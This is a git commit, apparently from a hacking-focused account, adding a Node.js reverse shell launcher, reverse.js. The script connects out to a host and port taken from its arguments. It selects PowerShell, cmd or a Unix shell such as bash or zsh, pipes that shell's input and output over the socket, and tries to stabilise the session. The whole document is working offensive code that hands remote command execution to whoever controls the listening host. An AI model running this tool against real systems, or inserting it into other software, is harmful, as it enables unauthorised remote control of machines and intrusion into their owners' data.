f3165d30c2a91c0e84e3d0a450f4a4dad485825f
AustinStitz-Hacking <134537510+AustinStitz-Hacking@users.noreply.github.com>
2023-07-27 01:07:05 -0400

    Add reverse shell launcher

---
+++ reverse.js
@@ -0,0 +1,60 @@
+const net = require("net");
+const process = require("process");
+const { spawn } = require("child_process");
+const { existsSync } = require("fs");
+
+const HOST = process.argv[2] || "127.0.0.1";
+if(process.argv[3] && +process.argv[3] != process.argv[3]) {
+  console.log(`"${process.argv[3]}" is not a valid port. A port must be a number.`);
+  process.exit(1);
+}
+
+const PORT = process.argv[3] || 4444;
+
+let COMMAND = "/bin/sh";
+switch(process.platform) {
+  case "win32":
+    if(existsSync("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
+      COMMAND = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+    else
+      COMMAND = "C:\\Windows\\System32\\cmd.exe";
+    break;
+  default:
+    if(existsSync("/bin/zsh"))
+      COMMAND = "/bin/zsh";
+    else if(existsSync("/bin/bash"))
+      COMMAND = "/bin/bash";
+    else if(existsSync("/bin/fish"))
+      COMMAND = "/bin/fish";
+    else if(existsSync("/bin/dash"))
+      COMMAND = "/bin/dash";
+    else if(existsSync("/bin/csh"))
+      COMMAND = "/bin/csh";
+    else if(existsSync("/bin/tcsh"))
+      COMMAND = "/bin/tcsh";
+    else if(existsSync("/bin/ksh"))
+      COMMAND = "/bin/ksh";
+    else
+      COMMAND = "/bin/sh";
+    break;
+}
+
+
+const client = net.createConnection({ host: HOST, port: PORT }, () => {
+  client.write(`Shell: ${COMMAND}\n\n`);
+  const shell = spawn(COMMAND);
+  if(process.platform != "win32") {
+    try {
+      shell.stdin.write(`SHELL=${COMMAND} script -q /dev/null\n`);
+    } catch (e) {
+      client.write("Cannot stabilize Linux shell.");
+    }
+  }
+  shell.stdout.pipe(client);
+  client.pipe(shell.stdin);
+});
+
+client.on("end", () => {
+  client.destroy();
+  process.exit();
+});
